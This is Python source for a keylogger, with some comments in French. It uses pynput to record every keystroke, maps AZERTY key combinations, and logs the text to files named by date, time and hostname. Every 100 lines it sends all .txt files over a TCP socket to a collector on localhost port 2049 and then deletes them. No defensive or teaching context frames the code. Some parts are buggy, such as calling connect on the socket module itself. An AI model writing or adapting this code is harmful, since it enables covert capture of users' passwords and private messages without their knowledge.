import socket
from pynput import keyboard
import datetime
import os

namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") +"_" + socket.gethostname() + ".txt"
f = open(namefile, "w+")
# crée un nouveau fichier texte intitulé date+heure+NOM_PC.txt
f.close()

liste = []
string = ''
caps = False
ctrl_l = False
alt_r = False
shift = False
count_line = 0

def list(k):
    global liste, string, caps, ctrl_l, shift, alt_r, count_line
    if k == 'Key.space':
        liste.append(string + ' ')
        string = ''
    elif k == 'Key.caps_lock':
        caps ^= True
    elif (k == 'Key.backspace') & (string != ''):
        string = string[0:-2]
    elif k == 'Key.enter':
        liste.append(string)
        print(liste)
        with open(namefile, "a") as f:
            f.writelines(liste)
            f.write("\n")
        liste = []
        string = ''
        count_line += 1
    else:
        if caps is True:
            k = k.upper()
            if k[1] == ",":
                k = "'?'"
            if k[1] == ":":
                k = "'/'"
            if k[1] == ";":
                k = "'.'"
            if k[1] == "&":
                k = "'1'"
            if k[1] == "é":
                k = "'2'"
            if k[1] == "'":
                k = "'4'"
            if k[1] == "(":
                k = "'5'"
            if k[1] == "§":
                k = "'6'"
            if k[1] == "è":
                k = "'7'"
            if k[1] == "!":
                k = "'8'"
            if k[1] == "ç":
                k = "'9'"
            if k[1] == "à":
                k = "'0'"
            if k[1] == "-":
                k = "'_'"
            if k[1] == "$":
                k = "'*'"
            if k[1] == "ù":
                k = "'%'"
            if k[1] == "=":
                k = "'+'"
        if (alt_r == True) and (ctrl_l == True) :
            if k[1] == "é":
                k = "'@'"
            if k[1] == "'":
                k = "'{'"
            if k[1] == "(":
                k = "'['"
            if k[1] == "ç":
                k = "'{'"
            if k[1] == "à":
                k = "'}'"
            if k[1] == "$":
                k = "']'"
        string = string + k[1]
    if count_line >= 100 :
        count_line = 0
        try:
            send_files()
            open(namefile, "w").close()  #supprime le .txt en cours dans lequel le script écrit actuellement
                                         #mais useless vu qu'on supprime dans send_files pour finir
        except:
            with open(namefile, "a") as f:
                f.write("\n send_files ERROR \n")
def on_release(key):
    global ctrl_l, alt_r, shift, caps
    if key == keyboard.Key.f10:
        return False  # stop le script
    elif '{0}'.format(key)=='Key.ctrl_l' :
        ctrl_l = False
    elif '{0}'.format(key)=='Key.alt_r' :
        alt_r = False
    elif '{0}'.format(key)=='Key.shift' :
        shift = False
        caps ^= True
    else:
        list('{0}'.format(key))


def on_press(key):
    global ctrl_l, alt_r, shift, caps
    if '{0}'.format(key)=='Key.ctrl_l' :
        ctrl_l = True
    if '{0}'.format(key)=='Key.alt_r' :
        alt_r = True
    if '{0}'.format(key)=='Key.shift' :
        shift = True
        caps ^= True


def send_files():
    global liste, socket

    # Lists all the .txt files in the directory
    temp_liste = os.listdir(".")
    liste = []
    for file in temp_liste:
        if file.find(".txt") != -1:
            liste.append(file)
    try:
        socket.connect(("localhost", 2049))
    except:
        print('CONNECT ERROR')
    # For every .txt file
    for text_file in liste:
        text_lines = []

        # Reads the lines of that file
        with open(text_file, "r") as ins:
            for line in ins:
                text_lines.append(line)

        # Send the name of the file
        socket.send(("DESC "+text_file+"\n").encode("latin1"))

        # Sends each lines registered in text_lines
        for line in text_lines:
            socket.send(("SEND {}\n".format(line)).encode("latin1"))

        # Save that file and goes to the next one
        socket.send("STOCK\n".encode("latin1"))
        os.remove(text_file)

    # Closes the socket
    socket.send("END\n".encode("latin1"))
    socket.close()


def send_list():
    global liste, socket
    socket.connect(("localhost", 2049))
    socket.send("DESC leNomDuFichier\n".encode("latin1"))
    for line in liste:
        socket.send(("SEND {}\n".format(line)).encode("latin1"))
    socket.send("STOCK\n".encode("latin1"))
    socket.close()


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
send_files()
